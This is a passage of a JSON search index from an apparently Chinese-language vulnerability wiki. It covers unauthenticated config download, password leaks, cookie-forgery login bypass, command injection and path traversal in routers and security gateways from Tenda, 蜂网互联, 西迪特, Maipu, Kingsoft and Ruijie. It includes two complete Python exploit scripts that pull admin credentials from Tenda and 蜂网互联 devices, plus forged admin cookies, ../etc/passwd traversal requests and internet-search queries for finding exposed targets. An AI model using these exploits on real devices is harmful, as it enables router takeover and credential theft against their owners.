","date":"0001-01-01","objectID":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-d151d31%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BD%BD/:0:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-d151d31%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"漏洞描述 攻击者可利用此漏洞，通过请求{IP}/goform/getimage即可下载当前路由器配置（包括管理员登录名），也可以通过请求激活telnet服务/goform/telnet（默认情况下该服务已启用）。 ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-d151d31%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BD%BD/:1:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-d151d31%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"漏洞影响 D301 1.2.11.2_EN D301 V2.0 50.22.1.8_EN D151 V2.0 50.21.1.5_EN ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-d151d31%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BD%BD/:2:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-d151d31%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"漏洞复现 poc： import struct import itertools import random, sys import requests import base64 FETCH_CODE = \"\\x80\\x0f\\x07\\xe7\\x83i\\xb0@v2\\x9c\\x8ef\\x93y\\xb8z\" ADMIN_LOG_CFG = {'AdminPassword': 'admin', 'SupportPassword': 'support'} CLEAR_CODE = 256 END_OF_CODE = CLEAR_CODE + 1 MIN_WIDTH = 8 DEFAULT_MIN_BITS = MIN_WIDTH + 1 DEFAULT_MAX_BITS = 12 def cmsDecoder(compressed_cfg): _cp_dict = dict((pt, struct.pack(\"B\", pt)) for pt in range(256)) _cp_dict[CLEAR_CODE] = CLEAR_CODE _cp_dict[END_OF_CODE] = END_OF_CODE prefix, offset, ignore = None, 0, 0 codepoints_arr, remainder, bits = [], [], [] init_csize = len(_cp_dict) codesize = init_csize minwidth = MIN_WIDTH while (1 \u003c\u003c minwidth) \u003c codesize: minwidth = minwidth + 1 pointwidth = minwidth buts_arr = [] for b in compressed_cfg: value = struct.unpack(\"B\", b)[0] for bitplusone in range(8, 0, -1): bitindex = bitplusone - 1 buts_arr.append(1 \u0026 (value \u003e\u003e bitindex)) for nextbit in buts_arr: offset = (offset + 1) % 8 if ignore \u003e 0: ignore = ignore - 1 continue bits.append(nextbit) if len(bits) == pointwidth: cp_int = 0 lsb_first = [b for b in bits] lsb_first.reverse() for bit_index in range(len(lsb_first)): if lsb_first[bit_index]: cp_int = cp_int | (1 \u003c\u003c bit_index) bits = [] codepoints_arr.append(cp_int) codesize = codesize + 1 if cp_int in [CLEAR_CODE, END_OF_CODE]: codesize = init_csize pointwidth = minwidth else: while codesize \u003e= (2 ** pointwidth): pointwidth = pointwidth + 1 if cp_int == END_OF_CODE: ignore = (8 - offset) % 8 decodedBytes = [] for cp_int in codepoints_arr: suffix = \"\" if cp_int == CLEAR_CODE: _cp_dict = dict((pt, struct.pack(\"B\", pt)) for pt in range(256)) _cp_dict[CLEAR_CODE] = CLEAR_CODE _cp_dict[END_OF_CODE] = END_OF_CODE prefix = None elif cp_int != END_OF_CODE: if cp_int in _cp_dict: suffix = _cp_dict[cp_int] if None != prefix: _cp_dict[len(_cp_dict)] = prefix + suffix[0] else: suffix = prefix + prefix[0] _cp_dict[len(_cp_dict)] = suffix prefix = suffix decoded = suffix for char in decoded: decodedBytes.append(char) return decodedBytes def exploit(ip): print \"[!] Downloading config\" try: r = requests.get(\"http://{}/goform/getimage\".format(ip)) pass except: print \"[-] Failed to download the config, the target may not be vulnerable\" BIN_CONTENT = r.content BIN_CONTENT = BIN_CONTENT[BIN_CONTENT.index(FETCH_CODE):][:16*50] CONFIG_XML = b\"\".join(cmsDecoder(BIN_CONTENT)) USER_, PASS_ = \"\", \"\" for i in ADMIN_LOG_CFG.keys(): if i in CONFIG_XML: CONFIG_XML = CONFIG_XML[CONFIG_XML.index(i) + len(i) + 1:] PASS_ = CONFIG_XML[:CONFIG_XML.index('\u003c/')] USER_ = ADMIN_LOG_CFG[i] print \"\\tusername: {}\\n\\tpassword: {}\\n\".format(USER_, base64.b64decode(PASS_).rstrip('\\x00')) return 0 print \"[-] Failed to decode the config file\\n\" return -1 if len(sys.argv) == 1: print \"usage: python2 \" + sys.argv[0] + \" router_ip\" print \"example: python2 exploit.py http://192.168.1.1\" exit() if __name__ == \"__main__\": print \"\"\"\\ _ _ ___ (~ )( ~) / \\_\\ \\/ / | D_ ]\\ \\/ -- By BenCh@li@h | D _]/\\ \\ -- BenChaliah@github \\___/ / /\\ \\\\ (_ )( _) \"\"\" try: exploit(sys.argv[1]) except Exception as e: print str(e) ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-d151d31%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BD%BD/:3:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-d151d31%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"蜂网互联 企业级路由器v4.31 密码泄露漏洞 CVE-2019-16313 ","date":"0001-01-01","objectID":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/:0:0","tags":null,"title":"","uri":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/"},{"categories":null,"content":"漏洞描述 蜂网互联企业级路由器v4.31存在接口未授权访问，导致攻击者可以是通过此漏洞得到路由器账号密码接管路由器 ","date":"0001-01-01","objectID":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/:1:0","tags":null,"title":"","uri":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/"},{"categories":null,"content":"漏洞影响 蜂网互联企业级路由器v4.31 ","date":"0001-01-01","objectID":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/:2:0","tags":null,"title":"","uri":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/"},{"categories":null,"content":"网络测绘 app=\"蜂网互联-互联企业级路由器\" ","date":"0001-01-01","objectID":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/:3:0","tags":null,"title":"","uri":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/"},{"categories":null,"content":"漏洞复现 登录页面登录后可以看到，账号密码存在接口访问 而 /action/usermanager.htm 存在未授权访问，可通过直接访问获得账号密码 不存在漏洞时 state值为 3 ","date":"0001-01-01","objectID":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/:4:0","tags":null,"title":"","uri":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: DrayTek企业网络设备 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/action/usermanager.htm\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/action/usermanager.htm \\033[0m\".format(target_url)) if \"pwd\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/:5:0","tags":null,"title":"","uri":"/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-16313/"},{"categories":null,"content":"西迪特 Wi-Fi Web管理 Cookie 越权访问漏洞 ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 西迪特 Wi-Fi Web管理系统后台过滤不足导致远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 西迪特 Wi-Fi Web管理 ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"Wi-Fi Web管理\" ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现o 登录页面 添加Cookie，即可登录后台 Cookie: timestamp=0; cooLogin=1; cooUser=admin ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"西迪特 Wi-Fi Web管理 jumpto.php 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 西迪特 Wi-Fi Web管理系统后台过滤不足导致远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 西迪特 Wi-Fi Web管理 ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"Wi-Fi Web管理\" ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现o 登录页面 通过越权漏洞获取权限，添加Cookie Cookie: timestamp=0; cooLogin=1; cooUser=admin 进入后台后，诊断功能点存在命令拼接执行漏洞 ","date":"0001-01-01","objectID":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%A5%BF%E8%BF%AA%E7%89%B9-wi-fi-web%E7%AE%A1%E7%90%86-jumpto.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"迈普 ISG1000安全网关 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 迈普 ISG1000安全网关 存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器任意文件 ","date":"0001-01-01","objectID":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 迈普 ISG1000安全网关 ","date":"0001-01-01","objectID":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"迈普通信技术股份有限公司\" ","date":"0001-01-01","objectID":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 请求的 POC 为 /webui/?g=sys_dia_data_down\u0026file_name=../etc/passwd ","date":"0001-01-01","objectID":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%BF%88%E6%99%AE-isg1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金山 VGM防毒墙 downFile.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金山 VGM防毒墙 downFile.php文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金山 VGM防毒墙 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"金山VGM\" ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /downFile.php?filename=../../../../etc/passwd ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-vgm%E9%98%B2%E6%AF%92%E5%A2%99-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 BCR商业无线云网关 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷 BCR商业无线云网关 存在后台命令执行漏洞，攻击者通过默认口令可以登陆后台构造特殊的参数执行任意命令，获取服务器权限 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷 BCR商业无线云网关 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 fid=\"N3IFMflkcmNQ2s4vuAhjzg==\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 通过弱口令登陆后台 admin 拼接命令 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-bcr%E5%95%86%E4%B8%9A%E6%97%A0%E7%BA%BF%E4%BA%91%E7%BD%91%E5%85%B3-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 EG易网关 branch_passw.php 远程命令执行 